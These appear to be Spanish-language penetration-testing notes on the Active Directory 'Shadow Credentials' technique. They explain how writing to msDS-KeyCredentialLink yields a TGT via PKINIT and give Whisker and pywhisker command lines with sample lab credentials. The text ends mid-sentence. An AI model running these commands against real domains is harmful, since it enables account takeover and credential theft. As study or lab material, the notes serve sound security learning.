# Info

- Tecnica de account takeover.
- Consiste en inyectar claves propias en el atributo msDS-KeyCredentialLink de un usuario/computadora
- Permite obtener un TGT mediante PKINIT.

### Requisitos

- DC > 2016
- Infraestructura PKI
- permisos de: GenericAll, GenericWrite o WriteProperty sobre msDS-KeyCredentialLink.

###### En bloodhound el permiso para escribir el msDS-KeyCredentialLink figura como "AddKeyCredentialLink"

### msDS-KeyCredentialLink

Este atributo contiene credenciales de clave, que son objetos serializados que incluyen información como la fecha de creación, el nombre completo del propietario, un GUID que representa el ID del dispositivo y, por supuesto, la clave pública. Dado que una cuenta puede tener varios dispositivos vinculados, msDS-KeyCredentialLinkes un atributo multivalor.


# Abuso

## Desde windows

### Wihisker

    .\\Whisker.exe add /target:<user>

Luego usamos el output de rubeus que nos da el script para obetener un ticket y hacer un ptt (lo más performante si hay kerberos) o el NTML hash para hacer PTH.



## Desde linux

### PyWhisker
#### Repo
    git clone -q https://github.com/ShutdownRepo/pywhisker

### Explotación

    python  pywhisker.py -d lab.local -u jeffry -p Music001 --target gabriel --action add --dc-ip 10.129.234.190

Esto nos creará

